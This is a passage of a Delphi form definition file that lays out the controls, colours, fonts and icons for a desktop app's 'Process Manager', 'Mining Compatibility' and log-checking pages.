          GlowEffect.GlowSize = 7
          GlowEffect.Offset = 0
          GlowEffect.Intensive = True
          GlowEffect.StyleColors = True
          GlowEffect.HotColor = clNone
          GlowEffect.PressedColor = clNone
          GlowEffect.FocusedColor = clNone
          GlowEffect.PressedGlowSize = 7
          GlowEffect.PressedAlphaValue = 255
          GlowEffect.States = [scsHot, scsPressed, scsFocused]
          ImageGlow = True
          ShowGalleryMenuFromTop = False
          ShowGalleryMenuFromRight = False
          ShowMenuArrow = True
          ShowFocusRect = True
          Down = False
          GroupIndex = 0
          AllowAllUp = False
          ToggleMode = False
        end
        object scGPButton11: TscGPButton
          Left = 19
          Top = 223
          Width = 382
          Height = 33
          FluentUIOpaque = False
          TabOrder = 5
          OnClick = scGPButton11Click
          Animation = True
          Badge.Color = clRed
          Badge.ColorAlpha = 255
          Badge.Font.Charset = DEFAULT_CHARSET
          Badge.Font.Color = clWhite
          Badge.Font.Height = -11
          Badge.Font.Name = 'Tahoma'
          Badge.Font.Style = [fsBold]
          Badge.Visible = False
          Caption = '                                              Check Logs'
          CaptionCenterAlignment = False
          CanFocused = False
          CustomDropDown = False
          DrawTextMode = scdtmGDI
          Margin = -1
          Spacing = 1
          Layout = blGlyphLeft
          Images = Form2.VirtualImageList2
          ImageIndex = 24
          ImageMargin = 1
          TransparentBackground = True
          Options.NormalColor = 2428680
          Options.HotColor = 3479824
          Options.PressedColor = 2428680
          Options.FocusedColor = 2428680
          Options.DisabledColor = 2428680
          Options.NormalColor2 = 2428680
          Options.HotColor2 = 3479824
          Options.PressedColor2 = 2428680
          Options.FocusedColor2 = clNone
          Options.DisabledColor2 = clNone
          Options.NormalColorAlpha = 255
          Options.HotColorAlpha = 255
          Options.PressedColorAlpha = 255
          Options.FocusedColorAlpha = 255
          Options.DisabledColorAlpha = 255
          Options.NormalColor2Alpha = 255
          Options.HotColor2Alpha = 255
          Options.PressedColor2Alpha = 255
          Options.FocusedColor2Alpha = 255
          Options.DisabledColor2Alpha = 255
          Options.FrameNormalColor = 4599078
          Options.FrameHotColor = 4599078
          Options.FramePressedColor = 4599078
          Options.FrameFocusedColor = 4599078
          Options.FrameDisabledColor = 14968160
          Options.FrameWidth = 1
          Options.FrameNormalColorAlpha = 255
          Options.FrameHotColorAlpha = 255
          Options.FramePressedColorAlpha = 255
          Options.FrameFocusedColorAlpha = 255
          Options.FrameDisabledColorAlpha = 255
          Options.FontNormalColor = 14968160
          Options.FontHotColor = 14968160
          Options.FontPressedColor = 14968160
          Options.FontFocusedColor = 14968160
          Options.FontDisabledColor = 14968160
          Options.ShapeFillGradientAngle = 90
          Options.ShapeFillGradientPressedAngle = -90
          Options.ShapeFillGradientColorOffset = 25
          Options.ShapeCornerRadius = 10
          Options.ShapeStyle = scgpRect
          Options.ShapeStyleLineSize = 0
          Options.ArrowSize = 9
          Options.ArrowAreaSize = 0
          Options.ArrowType = scgpatDefault
          Options.ArrowThickness = 2
          Options.ArrowThicknessScaled = False
          Options.ArrowNormalColor = 2428680
          Options.ArrowHotColor = clBtnText
          Options.ArrowPressedColor = clBtnText
          Options.ArrowFocusedColor = clBtnText
          Options.ArrowDisabledColor = clBtnText
          Options.ArrowNormalColorAlpha = 200
          Options.ArrowHotColorAlpha = 255
          Options.ArrowPressedColorAlpha = 255
          Options.ArrowFocusedColorAlpha = 200
          Options.ArrowDisabledColorAlpha = 125
          Options.StyleColors = True
          Options.PressedHotColors = False
          HotImageIndex = -1
          FluentLightEffect = False
          FocusedImageIndex = -1
          PressedImageIndex = -1
          UseGalleryMenuImage = False
          UseGalleryMenuCaption = False
          ScaleMarginAndSpacing = False
          WidthWithCaption = 0
          WidthWithoutCaption = 0
          SplitButton = False
          RepeatClick = False
          RepeatClickInterval = 100
          GlowEffect.Enabled = False
          GlowEffect.Color = clHighlight
          GlowEffect.AlphaValue = 255
          GlowEffect.GlowSize = 7
          GlowEffect.Offset = 0
          GlowEffect.Intensive = True
          GlowEffect.StyleColors = True
          GlowEffect.HotColor = clNone
          GlowEffect.PressedColor = clNone
          GlowEffect.FocusedColor = clNone
          GlowEffect.PressedGlowSize = 7
          GlowEffect.PressedAlphaValue = 255
          GlowEffect.States = [scsHot, scsPressed, scsFocused]
          ImageGlow = True
          ShowGalleryMenuFromTop = False
          ShowGalleryMenuFromRight = False
          ShowMenuArrow = True
          ShowFocusRect = True
          Down = False
          GroupIndex = 0
          AllowAllUp = False
          ToggleMode = False
        end
      end
    end
    object ProcessManager: TscGPPageControlPage
      Left = 0
      Top = 30
      Width = 420
      Height = 322
      HorzScrollBar.Tracking = True
      VertScrollBar.Tracking = True
      BorderStyle = bsNone
      Color = 2428680
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -12
      Font.Name = 'Segoe UI'
      Font.Style = []
      ParentColor = False
      ParentFont = False
      TabOrder = 3
      Visible = False
      WallpaperIndex = -1
      CustomBackgroundImageIndex = -1
      FluentUIOpaque = False
      StorePaintBuffer = False
      MouseWheelSupport = False
      BGStyle = scgppsColor
      object scGPPanel3: TscGPPanel
        Left = 3
        Top = 3
        Width = 414
        Height = 313
        FluentUIOpaque = False
        TabOrder = 0
        BlurBackground = False
        BlurBackgroundAmount = 5
        BackgroundStyle = gppbsColor
        ContentMarginLeft = 0
        ContentMarginRight = 0
        ContentMarginTop = 0
        ContentMarginBottom = 0
        CustomImageIndex = -1
        DragForm = False
        DragTopForm = True
        DrawTextMode = scdtmGDI
        FillGradientAngle = 90
        FillGradientBeginAlpha = 255
        FillGradientEndAlpha = 255
        FillGradientBeginColorOffset = 25
        FillGradientEndColorOffset = 25
        FrameWidth = 1
        FillColor = 3479824
        FillColorAlpha = 255
        FillColor2 = 3479824
        FrameColor = 4599078
        FrameColorAlpha = 255
        FrameRadius = 5
        ShowCaption = False
        CaptionGlowEffect.Enabled = False
        CaptionGlowEffect.Color = clBtnShadow
        CaptionGlowEffect.AlphaValue = 255
        CaptionGlowEffect.GlowSize = 7
        CaptionGlowEffect.Offset = 0
        CaptionGlowEffect.Intensive = True
        CaptionGlowEffect.StyleColors = True
        Color = 2428680
        Caption = 'scGPPanel3'
        TransparentBackground = True
        StorePaintBuffer = True
        Sizeable = False
        WallpaperIndex = -1
        WordWrap = False
        object Label5: TLabel
          Left = 41
          Top = 17
          Width = 105
          Height = 16
          Caption = 'Process Manager'
          Font.Charset = DEFAULT_CHARSET
          Font.Color = 13017238
          Font.Height = -12
          Font.Name = 'JetBrains Mono'
          Font.Style = []
          ParentFont = False
        end
        object scGPImage3: TscGPImage
          Left = 19
          Top = 17
          Width = 16
          Height = 16
          FluentUIOpaque = False
          TabOrder = 0
          CustomImageIndex = -1
          DragForm = False
          DragTopForm = True
          StyleKind = scpsPanel
          ShowCaption = False
          BorderStyle = scpbsNone
          WallpaperIndex = -1
          LightBorderColor = 3479824
          ShadowBorderColor = 3479824
          CaptionGlowEffect.Enabled = False
          CaptionGlowEffect.Color = clBtnShadow
          CaptionGlowEffect.AlphaValue = 255
          CaptionGlowEffect.GlowSize = 7
          CaptionGlowEffect.Offset = 0
          CaptionGlowEffect.Intensive = True
          CaptionGlowEffect.StyleColors = True
          Color = 3479824
          Caption = 'scGPImage1'
          StorePaintBuffer = False
          WordWrap = False
          ImageIndex = -1
          InterpolationMode = scgppimDefault
          ClipFrame = scgpcfNone
          ClipFrameRadius = 10
          ClipFrameFillColor = 3479824
          ClipFrameFillColorAlpha = 150
          ClipFrameColor = 3479824
          ClipFrameWidth = 2
          DrawTextMode = scdtmGDI
          RotationAngle = 0
          AnimationAcceleration = False
          RotateAnimation = False
          Picture.Data = {
            0954506E67496D61676589504E470D0A1A0A0000000D49484452000000100000
            001008060000001FF3FF6100000006624B474400FF00FF00FFA0BDA793000000
            EB4944415478DA6364A01030A655F6FFA7D880E2CA02B234F7B64FC06EC07FA0
            9BB6EEBFCEE0EDA8C9C0C848860127CE3F6258BBF30A43B0870E8385811C6906
            7CFFF19BA17BF621067B7325868327EF3194A6D93170B2B3E237E005A31A8A84
            A99E0C4398971EC3AAAD9718D858991902DCB419D6EFBACA70ECDC43147512FF
            6FE10FC42FDF7E31F4005DE3EDA8010C931B0C25A9760C3C5C6C84C380D8F020
            CA80FFC028D9B4E73A839F0B2846184937001F801B40AAC699A5220CE9DD6FC0
            6CCA93322E0990C15E1EAE60F6B61DBB1966B517321265406A65FF2EA0A02B0E
            C56767B6179A10E502620100082A792D1E9D8DBB0000000049454E44AE426082}
          Stretch = True
          Transparent = True
        end
        object ProcessListBox: TscListBox
          Left = 19
          Top = 50
          Width = 375
          Height = 175
          FluentUIOpaque = False
          ItemIndex = -1
          ImageIndex = -1
          WordBreak = False
          LineColor = 3479824
          ShowLines = False
          SelectionStyle = scstColor
          ShowFocusRect = False
          SelectionColor = 16740972
          SelectionTextColor = clWhite
          BorderStyle = bsNone
          Color = 2428680
          Font.Charset = DEFAULT_CHARSET
          Font.Color = 13017238
          Font.Height = -12
          Font.Name = 'JetBrains Mono'
          Font.Style = []
          ParentFont = False
          TabOrder = 1
          OnClick = ProcessListBoxClick
        end
        object scEdit3: TscEdit
          Left = 19
          Top = 231
          Width = 187
          Height = 24
          FluentUIOpaque = False
          UseFontColorToStyleColor = False
          ContentMarginLeft = 0
          ContentMarginRight = 0
          ContentMarginTop = 0
          ContentMarginBottom = 0
          CustomBackgroundImageNormalIndex = -1
          CustomBackgroundImageHotIndex = -1
          CustomBackgroundImageDisabledIndex = -1
          PromptTextColor = clNone
          HideMaskWithEmptyText = False
          HidePromptTextIfFocused = False
          WallpaperIndex = -1
          LeftButton.ComboButton = False
          LeftButton.Enabled = True
          LeftButton.Visible = False
          LeftButton.ShowHint = False
          LeftButton.ShowEllipses = False
          LeftButton.StyleKind = scbsPushButton
          LeftButton.Width = 18
          LeftButton.ImageIndex = -1
          LeftButton.ImageHotIndex = -1
          LeftButton.ImagePressedIndex = -1
          LeftButton.RepeatClick = False
          LeftButton.RepeatClickInterval = 200
          LeftButton.CustomImageNormalIndex = -1
          LeftButton.CustomImageHotIndex = -1
          LeftButton.CustomImagePressedIndex = -1
          LeftButton.CustomImageDisabledIndex = -1
          RightButton.ComboButton = False
          RightButton.Enabled = True
          RightButton.Visible = False
          RightButton.ShowHint = False
          RightButton.ShowEllipses = False
          RightButton.StyleKind = scbsPushButton
          RightButton.Width = 18
          RightButton.ImageIndex = -1
          RightButton.ImageHotIndex = -1
          RightButton.ImagePressedIndex = -1
          RightButton.RepeatClick = False
          RightButton.RepeatClickInterval = 200
          RightButton.CustomImageNormalIndex = -1
          RightButton.CustomImageHotIndex = -1
          RightButton.CustomImagePressedIndex = -1
          RightButton.CustomImageDisabledIndex = -1
          Transparent = False
          BorderKind = scebColorFrame
          CustomDraw = False
          FrameColor = 4599078
          FrameActiveColor = 4599078
          Text = ''
          Color = 2428680
          Font.Charset = DEFAULT_CHARSET
          Font.Color = 13017238
          Font.Height = -12
          Font.Name = 'JetBrains Mono'
          Font.Style = []
          ParentFont = False
          TabOrder = 2
        end
        object scEdit1: TscEdit
          Left = 212
          Top = 231
          Width = 182
          Height = 24
          FluentUIOpaque = False
          UseFontColorToStyleColor = False
          ContentMarginLeft = 0
          ContentMarginRight = 0
          ContentMarginTop = 0
          ContentMarginBottom = 0
          CustomBackgroundImageNormalIndex = -1
          CustomBackgroundImageHotIndex = -1
          CustomBackgroundImageDisabledIndex = -1
          PromptTextColor = clNone
          HideMaskWithEmptyText = False
          HidePromptTextIfFocused = False
          WallpaperIndex = -1
          LeftButton.ComboButton = False
          LeftButton.Enabled = True
          LeftButton.Visible = False
          LeftButton.ShowHint = False
          LeftButton.ShowEllipses = False
          LeftButton.StyleKind = scbsPushButton
          LeftButton.Width = 18
          LeftButton.ImageIndex = -1
          LeftButton.ImageHotIndex = -1
          LeftButton.ImagePressedIndex = -1
          LeftButton.RepeatClick = False
          LeftButton.RepeatClickInterval = 200
          LeftButton.CustomImageNormalIndex = -1
          LeftButton.CustomImageHotIndex = -1
          LeftButton.CustomImagePressedIndex = -1
          LeftButton.CustomImageDisabledIndex = -1
          RightButton.ComboButton = False
          RightButton.Enabled = True
          RightButton.Visible = False
          RightButton.ShowHint = False
          RightButton.ShowEllipses = False
          RightButton.StyleKind = scbsPushButton
          RightButton.Width = 18
          RightButton.ImageIndex = -1
          RightButton.ImageHotIndex = -1
          RightButton.ImagePressedIndex = -1
          RightButton.RepeatClick = False
          RightButton.RepeatClickInterval = 200
          RightButton.CustomImageNormalIndex = -1
          RightButton.CustomImageHotIndex = -1
          RightButton.CustomImagePressedIndex = -1
          RightButton.CustomImageDisabledIndex = -1
          Transparent = False
          BorderKind = scebColorFrame
          CustomDraw = False
          FrameColor = 4599078
          FrameActiveColor = 4599078
          Text = ''
          Color = 2428680
          Font.Charset = DEFAULT_CHARSET
          Font.Color = 13017238
          Font.Height = -12
          Font.Name = 'JetBrains Mono'
          Font.Style = []
          ParentFont = False
          TabOrder = 3
          OnChange = scEdit1Change
        end
        object scGPButton2: TscGPButton
          Left = 19
          Top = 260
          Width = 187
          Height = 33
          FluentUIOpaque = False
          TabOrder = 4
          OnClick = scGPButton2Click
          Animation = True
          Badge.Color = clRed
          Badge.ColorAlpha = 255
          Badge.Font.Charset = DEFAULT_CHARSET
          Badge.Font.Color = clWhite
          Badge.Font.Height = -11
          Badge.Font.Name = 'Tahoma'
          Badge.Font.Style = [fsBold]
          Badge.Visible = False
          Caption = '              Get Processes'
          CaptionCenterAlignment = False
          CanFocused = False
          CustomDropDown = False
          DrawTextMode = scdtmGDI
          Margin = -1
          Spacing = 1
          Layout = blGlyphLeft
          Images = Form2.VirtualImageList2
          ImageIndex = 17
          ImageMargin = 1
          TransparentBackground = True
          Options.NormalColor = 2428680
          Options.HotColor = 3479824
          Options.PressedColor = 2428680
          Options.FocusedColor = 2428680
          Options.DisabledColor = 2428680
          Options.NormalColor2 = 2428680
          Options.HotColor2 = 3479824
          Options.PressedColor2 = 2428680
          Options.FocusedColor2 = clNone
          Options.DisabledColor2 = clNone
          Options.NormalColorAlpha = 255
          Options.HotColorAlpha = 255
          Options.PressedColorAlpha = 255
          Options.FocusedColorAlpha = 255
          Options.DisabledColorAlpha = 255
          Options.NormalColor2Alpha = 255
          Options.HotColor2Alpha = 255
          Options.PressedColor2Alpha = 255
          Options.FocusedColor2Alpha = 255
          Options.DisabledColor2Alpha = 255
          Options.FrameNormalColor = 4599078
          Options.FrameHotColor = 4599078
          Options.FramePressedColor = 4599078
          Options.FrameFocusedColor = 4599078
          Options.FrameDisabledColor = 14968160
          Options.FrameWidth = 1
          Options.FrameNormalColorAlpha = 255
          Options.FrameHotColorAlpha = 255
          Options.FramePressedColorAlpha = 255
          Options.FrameFocusedColorAlpha = 255
          Options.FrameDisabledColorAlpha = 255
          Options.FontNormalColor = 14968160
          Options.FontHotColor = 14968160
          Options.FontPressedColor = 14968160
          Options.FontFocusedColor = 14968160
          Options.FontDisabledColor = 14968160
          Options.ShapeFillGradientAngle = 90
          Options.ShapeFillGradientPressedAngle = -90
          Options.ShapeFillGradientColorOffset = 25
          Options.ShapeCornerRadius = 10
          Options.ShapeStyle = scgpRect
          Options.ShapeStyleLineSize = 0
          Options.ArrowSize = 9
          Options.ArrowAreaSize = 0
          Options.ArrowType = scgpatDefault
          Options.ArrowThickness = 2
          Options.ArrowThicknessScaled = False
          Options.ArrowNormalColor = 2428680
          Options.ArrowHotColor = clBtnText
          Options.ArrowPressedColor = clBtnText
          Options.ArrowFocusedColor = clBtnText
          Options.ArrowDisabledColor = clBtnText
          Options.ArrowNormalColorAlpha = 200
          Options.ArrowHotColorAlpha = 255
          Options.ArrowPressedColorAlpha = 255
          Options.ArrowFocusedColorAlpha = 200
          Options.ArrowDisabledColorAlpha = 125
          Options.StyleColors = True
          Options.PressedHotColors = False
          HotImageIndex = -1
          FluentLightEffect = False
          FocusedImageIndex = -1
          PressedImageIndex = -1
          UseGalleryMenuImage = False
          UseGalleryMenuCaption = False
          ScaleMarginAndSpacing = False
          WidthWithCaption = 0
          WidthWithoutCaption = 0
          SplitButton = False
          RepeatClick = False
          RepeatClickInterval = 100
          GlowEffect.Enabled = False
          GlowEffect.Color = clHighlight
          GlowEffect.AlphaValue = 255
          GlowEffect.GlowSize = 7
          GlowEffect.Offset = 0
          GlowEffect.Intensive = True
          GlowEffect.StyleColors = True
          GlowEffect.HotColor = clNone
          GlowEffect.PressedColor = clNone
          GlowEffect.FocusedColor = clNone
          GlowEffect.PressedGlowSize = 7
          GlowEffect.PressedAlphaValue = 255
          GlowEffect.States = [scsHot, scsPressed, scsFocused]
          ImageGlow = True
          ShowGalleryMenuFromTop = False
          ShowGalleryMenuFromRight = False
          ShowMenuArrow = True
          ShowFocusRect = True
          Down = False
          GroupIndex = 0
          AllowAllUp = False
          ToggleMode = False
        end
        object scGPButton3: TscGPButton
          Left = 212
          Top = 260
          Width = 182
          Height = 33
          FluentUIOpaque = False
          TabOrder = 5
          OnClick = scGPButton3Click
          Animation = True
          Badge.Color = clRed
          Badge.ColorAlpha = 255
          Badge.Font.Charset = DEFAULT_CHARSET
          Badge.Font.Color = clWhite
          Badge.Font.Height = -11
          Badge.Font.Name = 'Tahoma'
          Badge.Font.Style = [fsBold]
          Badge.Visible = False
          Caption = '              Kill Process'
          CaptionCenterAlignment = False
          CanFocused = False
          CustomDropDown = False
          DrawTextMode = scdtmGDI
          Margin = -1
          Spacing = 1
          Layout = blGlyphLeft
          Images = VirtualImageList1
          ImageIndex = 31
          ImageMargin = 1
          TransparentBackground = True
          Options.NormalColor = 2428680
          Options.HotColor = 3479824
          Options.PressedColor = 2428680
          Options.FocusedColor = 2428680
          Options.DisabledColor = 2428680
          Options.NormalColor2 = 2428680
          Options.HotColor2 = 3479824
          Options.PressedColor2 = 2428680
          Options.FocusedColor2 = clNone
          Options.DisabledColor2 = clNone
          Options.NormalColorAlpha = 255
          Options.HotColorAlpha = 255
          Options.PressedColorAlpha = 255
          Options.FocusedColorAlpha = 255
          Options.DisabledColorAlpha = 255
          Options.NormalColor2Alpha = 255
          Options.HotColor2Alpha = 255
          Options.PressedColor2Alpha = 255
          Options.FocusedColor2Alpha = 255
          Options.DisabledColor2Alpha = 255
          Options.FrameNormalColor = 4599078
          Options.FrameHotColor = 4599078
          Options.FramePressedColor = 4599078
          Options.FrameFocusedColor = 4599078
          Options.FrameDisabledColor = 14968160
          Options.FrameWidth = 1
          Options.FrameNormalColorAlpha = 255
          Options.FrameHotColorAlpha = 255
          Options.FramePressedColorAlpha = 255
          Options.FrameFocusedColorAlpha = 255
          Options.FrameDisabledColorAlpha = 255
          Options.FontNormalColor = 14968160
          Options.FontHotColor = 14968160
          Options.FontPressedColor = 14968160
          Options.FontFocusedColor = 14968160
          Options.FontDisabledColor = 14968160
          Options.ShapeFillGradientAngle = 90
          Options.ShapeFillGradientPressedAngle = -90
          Options.ShapeFillGradientColorOffset = 25
          Options.ShapeCornerRadius = 10
          Options.ShapeStyle = scgpRect
          Options.ShapeStyleLineSize = 0
          Options.ArrowSize = 9
          Options.ArrowAreaSize = 0
          Options.ArrowType = scgpatDefault
          Options.ArrowThickness = 2
          Options.ArrowThicknessScaled = False
          Options.ArrowNormalColor = 2428680
          Options.ArrowHotColor = clBtnText
          Options.ArrowPressedColor = clBtnText
          Options.ArrowFocusedColor = clBtnText
          Options.ArrowDisabledColor = clBtnText
          Options.ArrowNormalColorAlpha = 200
          Options.ArrowHotColorAlpha = 255
          Options.ArrowPressedColorAlpha = 255
          Options.ArrowFocusedColorAlpha = 200
          Options.ArrowDisabledColorAlpha = 125
          Options.StyleColors = True
          Options.PressedHotColors = False
          HotImageIndex = -1
          FluentLightEffect = False
          FocusedImageIndex = -1
          PressedImageIndex = -1
          UseGalleryMenuImage = False
          UseGalleryMenuCaption = False
          ScaleMarginAndSpacing = False
          WidthWithCaption = 0
          WidthWithoutCaption = 0
          SplitButton = False
          RepeatClick = False
          RepeatClickInterval = 100
          GlowEffect.Enabled = False
          GlowEffect.Color = clHighlight
          GlowEffect.AlphaValue = 255
          GlowEffect.GlowSize = 7
          GlowEffect.Offset = 0
          GlowEffect.Intensive = True
          GlowEffect.StyleColors = True
          GlowEffect.HotColor = clNone
          GlowEffect.PressedColor = clNone
          GlowEffect.FocusedColor = clNone
          GlowEffect.PressedGlowSize = 7
          GlowEffect.PressedAlphaValue = 255
          GlowEffect.States = [scsHot, scsPressed, scsFocused]
          ImageGlow = True
          ShowGalleryMenuFromTop = False
          ShowGalleryMenuFromRight = False
          ShowMenuArrow = True
          ShowFocusRect = True
          Down = False
          GroupIndex = 0
          AllowAllUp = False
          ToggleMode = False
        end
      end
    end
    object GPU: TscGPPageControlPage
      Left = 0
      Top = 30
      Width = 420
      Height = 322
      HorzScrollBar.Tracking = True
      VertScrollBar.Tracking = True
      BorderStyle = bsNone
      Color = 2428680
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -12
      Font.Name = 'Segoe UI'
      Font.Style = []
      ParentColor = False
      ParentFont = False
      TabOrder = 2
      Visible = False
      WallpaperIndex = -1
      CustomBackgroundImageIndex = -1
      FluentUIOpaque = False
      StorePaintBuffer = False
      MouseWheelSupport = False
      BGStyle = scgppsColor
      object scGPPanel2: TscGPPanel
        Left = 3
        Top = 3
        Width = 414
        Height = 313
        FluentUIOpaque = False
        TabOrder = 0
        BlurBackground = False
        BlurBackgroundAmount = 5
        BackgroundStyle = gppbsColor
        ContentMarginLeft = 0
        ContentMarginRight = 0
        ContentMarginTop = 0
        ContentMarginBottom = 0
        CustomImageIndex = -1
        DragForm = False
        DragTopForm = True
        DrawTextMode = scdtmGDI
        FillGradientAngle = 90
        FillGradientBeginAlpha = 255
        FillGradientEndAlpha = 255
        FillGradientBeginColorOffset = 25
        FillGradientEndColorOffset = 25
        FrameWidth = 1
        FillColor = 3479824
        FillColorAlpha = 255
        FillColor2 = 3479824
        FrameColor = 4599078
        FrameColorAlpha = 255
        FrameRadius = 5
        ShowCaption = False
        CaptionGlowEffect.Enabled = False
        CaptionGlowEffect.Color = clBtnShadow
        CaptionGlowEffect.AlphaValue = 255
        CaptionGlowEffect.GlowSize = 7
        CaptionGlowEffect.Offset = 0
        CaptionGlowEffect.Intensive = True
        CaptionGlowEffect.StyleColors = True
        Color = 2428680
        Caption = 'scGPPanel3'
        TransparentBackground = True
        StorePaintBuffer = True
        Sizeable = False
        WallpaperIndex = -1
        WordWrap = False
        object Label4: TLabel
          Left = 41
          Top = 17
          Width = 140
          Height = 16
          Caption = 'Mining Compatibility'
          Font.Charset = DEFAULT_CHARSET
          Font.Color = 13017238
          Font.Height = -12
          Font.Name = 'JetBrains Mono'
          Font.Style = []
          ParentFont = False
        end
        object scGPImage2: TscGPImage
          Left = 19
          Top = 17
          Width = 16
          Height = 16
          FluentUIOpaque = False
          TabOrder = 0
          CustomImageIndex = -1
          DragForm = False
          DragTopForm = True
          StyleKind = scpsPanel
          ShowCaption = False
          BorderStyle = scpbsNone
          WallpaperIndex = -1
          LightBorderColor = 3479824
          ShadowBorderColor = 3479824
          CaptionGlowEffect.Enabled = False
          CaptionGlowEffect.Color = clBtnShadow
          CaptionGlowEffect.AlphaValue = 255
          CaptionGlowEffect.GlowSize = 7
          CaptionGlowEffect.Offset = 0
          CaptionGlowEffect.Intensive = True
          CaptionGlowEffect.StyleColors = True
          Color = 3479824
          Caption = 'scGPImage1'
          StorePaintBuffer = False
          WordWrap = False
          ImageIndex = -1
          InterpolationMode = scgppimDefault
          ClipFrame = scgpcfNone
          ClipFrameRadius = 10
          ClipFrameFillColor = 3479824
          ClipFrameFillColorAlpha = 150
          ClipFrameColor = 3479824
          ClipFrameWidth = 2
          DrawTextMode = scdtmGDI
          RotationAngle = 0
          AnimationAcceleration = False
          RotateAnimation = False
          Picture.Data = {
            0954506E67496D61676589504E470D0A1A0A0000000D49484452000000100000
            001008060000001FF3FF6100000006624B474400FF00FF00FFA0BDA793000001
            374944415478DA63ACE89EF39D8181616247694A05031980B1A47BBA180B03EB
            23A0011C6419002280AEF8FF4CF016691A19197FB33033B5C00D700A5524C980
            6F3F7F30AC3F72F0378A01FB56DF47510412FBFBF71FC3DEB5C7192E9E80B850
            CF428DC125D8928199998961C99E9D0C040DD8BDF208C385E3771842A3E219DE
            BF7BC7B06DE31A0633471D06D7306B4C03B081CEFCB90C16560E0CF7EEDD61F8
            FFFF3F8389B905C38ECDEB18CA2624116BC01C86C8D854864307F731FCF9FD9B
            41574F9F61CFCE2D0CE5139389F4C2AAA30CA7F65F6130B5B0669091536058BF
            6A296E2FE00AC4EDCB0F315C8606A2B1BD368373108E4024057CFFF913188D87
            7E519290FEB23233D7C30D002665C669552EFF334BE251144EEF59C890D5B607
            2E07E3C30D4237009B6D300390F9580D20C90FC8065002003956B57820404CE6
            0000000049454E44AE426082}
          Stretch = True
          Transparent = True
        end
        object miningedit: TscGPMemo
          Left = 19
          Top = 56
          Width = 382
          Height = 193
          FluentUIOpaque = False
          Options.NormalColor = 3479824
          Options.HotColor = 3479824
          Options.FocusedColor = 3479824
          Options.DisabledColor = 3479824
          Options.NormalColorAlpha = 255
          Options.HotColorAlpha = 255
          Options.FocusedColorAlpha = 255
          Options.DisabledColorAlpha = 150
          Options.FrameNormalColor = 4599078
          Options.FrameHotColor = 4599078
          Options.FrameFocusedColor = 4599078
          Options.FrameDisabledColor = 4599078
          Options.FrameWidth = 1
          Options.FrameNormalColorAlpha = 255
          Options.FrameHotColorAlpha = 255
          Options.FrameFocusedColorAlpha = 255
          Options.FrameDisabledColorAlpha = 255
          Options.FontNormalColor = clWhite
          Options.FontHotColor = clWhite
          Options.FontFocusedColor = clWhite
          Options.FontDisabledColor = clWhite
          Options.ShapeFillGradientAngle = -90
          Options.ShapeFillGradientBeginColorOffset = 25
          Options.ShapeFillGradientEndColorOffset = 25
          Options.ShapeCornerRadius = 0
          Options.ScaleFrameWidth = False
          Options.StyleColors = True
          ScrollBarOptions.BorderWidth = 0
          ScrollBarOptions.FillColor = clBtnFace
          ScrollBarOptions.FillColorAlpha = 100
          ScrollBarOptions.ThumbColor = clWindowText
          ScrollBarOptions.ThumbColorAlpha = 50
          ScrollBarOptions.ThumbColorHotAlpha = 100
          ScrollBarOptions.ThumbColorPressedAlpha = 150
          ScrollBarOptions.ThumbRounded = False
          ScrollBarOptions.Position = scgpsbDefault
          ScrollBarOptions.ThumbChangeSizeEffect = False
          ScrollBarOptions.Size = 11
          Color = 2428680
          ContentMarginLeft = 5
          ContentMarginRight = 5
          ContentMarginTop = 5
          ContentMarginBottom = 5
          Font.Charset = DEFAULT_CHARSET
          Font.Color = clWhite
          Font.Height = -12
          Font.Name = 'JetBrains Mono'
          Font.Style = []
          HidePromptTextIfFocused = False
          PromptTextColor = clWhite
          Lines.Strings = (
            'scGPMemo1')
          ParentFont = False
          TabOrder = 1
          Transparent = False
        end
        object scGPButton1: TscGPButton
          Left = 19
          Top = 255
          Width = 382
          Height = 33
          FluentUIOpaque = False
          TabOrder = 2
          OnClick = scGPButton1Click
          Animation = True
          Badge.Color = clRed
          Badge.ColorAlpha = 255
          Badge.Font.Charset = DEFAULT_CHARSET
          Badge.Font.Color = clWhite
          Badge.Font.Height = -11
          Badge.Font.Name = 'Tahoma'
          Badge.Font.Style = [fsBold]
          Badge.Visible = False
          Caption = '                                     Check Compatibility'
          CaptionCenterAlignment = False
          CanFocused = False
          CustomDropDown = False
          DrawTextMode = scdtmGDI
          Margin = -1
          Spacing = 1
          Layout = blGlyphLeft
          Images = Form2.VirtualImageList2
          ImageIndex = 20
          ImageMargin = 1
          TransparentBackground = True
          Options.NormalColor = 2428680
          Options.HotColor = 3479824
          Options.PressedColor = 2428680
          Options.FocusedColor = 2428680
          Options.DisabledColor = 2428680
          Options.NormalColor2 = 2428680
          Options.HotColor2 = 3479824
          Options.PressedColor2 = 2428680
          Options.FocusedColor2 = clNone
          Options.DisabledColor2 = clNone
          Options.NormalColorAlpha = 255
          Options.HotColorAlpha = 255
          Options.PressedColorAlpha = 255
          Options.FocusedColorAlpha = 255
          Options.DisabledColorAlpha = 255
          Options.NormalColor2Alpha = 255
          Options.HotColor2Alpha = 255
          Options.PressedColor2Alpha = 255
          Options.FocusedColor2Alpha = 255
          Options.DisabledColor2Alpha = 255
          Options.FrameNormalColor = 4599078
          Options.FrameHotColor = 4599078
          Options.FramePressedColor = 4599078
          Options.FrameFocusedColor = 4599078
          Options.FrameDisabledColor = 14968160
          Options.FrameWidth = 1
          Options.FrameNormalColorAlpha = 255
          Options.FrameHotColorAlpha = 255
          Options.FramePressedColorAlpha = 255
          Options.FrameFocusedColorAlpha = 255
          Options.FrameDisabledColorAlpha = 255
          Options.FontNormalColor = 14968160
          Options.FontHotColor = 14968160
          Options.FontPressedColor = 14968160
          Options.FontFocusedColor = 14968160
          Options.FontDisabledColor = 14968160
          Options.ShapeFillGradientAngle = 90
          Options.ShapeFillGradientPressedAngle = -90
          Options.ShapeFillGradientColorOffset = 25
          Options.ShapeCornerRadius = 10
          Options.ShapeStyle = scgpRect
          Options.ShapeStyleLineSize = 0
          Options.ArrowSize = 9
          Options.ArrowAreaSize = 0
          Options.ArrowType = scgpatDefault
          Options.ArrowThickness = 2
          Options.ArrowThicknessScaled = False
          Options.ArrowNormalColor = 2428680
          Options.ArrowHotColor = clBtnText
          Options.ArrowPressedColor = clBtnText
          Options.ArrowFocusedColor = clBtnText
          Options.ArrowDisabledColor = clBtnText
          Options.ArrowNormalColorAlpha = 200
          Options.ArrowHotColorAlpha = 255
          Options.ArrowPressedColorAlpha = 255
          Options.ArrowFocusedColorAlpha = 200
          Options.ArrowDisabledColorAlpha = 125
          Options.StyleColors = True
          Options.PressedHotColors = False
